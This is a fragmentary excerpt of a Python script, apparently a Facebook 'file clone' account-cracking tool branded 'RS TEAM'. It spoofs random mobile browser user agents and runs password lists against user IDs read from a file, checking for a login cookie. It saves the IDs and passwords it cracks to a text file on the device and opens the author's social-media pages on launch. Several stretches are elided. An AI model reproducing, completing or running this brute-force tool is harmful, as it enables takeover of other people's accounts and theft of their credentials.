...
os.system('clear')
animation("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92m𝙁𝙊𝙇𝙇𝙊𝙒 𝙈𝙔 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆  𝘼𝘾𝘾𝙊𝙐𝙉𝙏")
time.sleep(3)
os.system(f'xdg-open https://www.facebook.com/Rs.Robi.60')
print()
animation("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92m𝙁𝙊𝙇𝙇𝙊𝙒 𝙈𝙔 𝙏𝙄𝙆𝙏𝙊𝙆  𝘼𝘾𝘾𝙊𝙐𝙉𝙏")
time.sleep(3)
os.system(f'xdg-open https://www.tiktok.com/@rs_robi_s?_t=8keg9QpdXEX&_r=1')
print()
attempts = 0
...
for agent in range(random.randint(89999, 150000)):
    ...
    b=random.choice(['6.1','7.1','8.1','9.1'])
    c='; RX17Neo; wv)'
    ...
    n='Mobile Safari/537.36 EdgA/18.8748'
...
\033[38;2;148;0;211m ██████   ██████  ██████  ██ RS
\033[38;2;0;127;255m ██   ██ ██    ██ ██   ██ ██ T
\033[38;2;255;204;0m ██████  ██    ██ ██████  ██ E
\033[38;2;255;127;0m ██   ██ ██    ██ ██   ██ ██ A
 \033[38;2;128;0;0m██   ██  ██████  ██████  ██ M 
\x1b[1;93m┏───────────────────────────────────────────────┓
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘈𝘜𝘛𝘏𝘖𝘙     \x1b[1;97m: \033[38;2;0;127;255mSOHAG HOSSAIN ROBI 
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘛𝘠𝘗𝘌       \x1b[1;97m: \033[38;2;0;127;255mFREE🔥
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘎𝘐𝘛𝘏𝘜𝘉     \x1b[1;97m: \033[38;2;0;127;255mRs-Robi-60
\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘛𝘖𝘖𝘓       \x1b[1;97m: \033[38;2;0;127;255mFILE CLONE
...
def menu():
    try:
        ...
        if 1 == 1:
            ...
            if xd in ['01', '1']:
                clear()
                print('\033[38;2;0;255;0m[PUT FILE EXAMPLE:  /sdcard/ROBI.txt  Etc...]')
...
def m1(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write('\r\r\033[1;33m「RS-TEAM-M1」 %s - \033[1;32m「OK ID:-%s」'% (loop, len(oks)));sys.stdout.flush()
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\r\033[1;31m[ROBI-CP]\033[1;35m  ' +ids+ ' • ' +pas+ ' \033[0;97m')
                with open('/sdcard/ROBI-CP.txt', 'a') as file:
                    file.write('UID: ' + ids + '\n')
                    file.write('Password: ' + pas + '\n')
                cps.append(ids)
                break
...
def m2(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write('\r\r\033[1;33m「RS-TEAM-M2」 %s - \033[1;32m「OK ID:-%s」'% (loop, len(oks)));sys.stdout.flush()
    ses = requests.Session()
    try:
        first = names.split(' ')[0]
        try:
...
def superuser():
    ...
    if id in DARK:
        ...
        os.system("xdg-open https://www.tiktok.com/@rs_robi_s?_t=8keg9QpdXEX&_r=1")
superuser()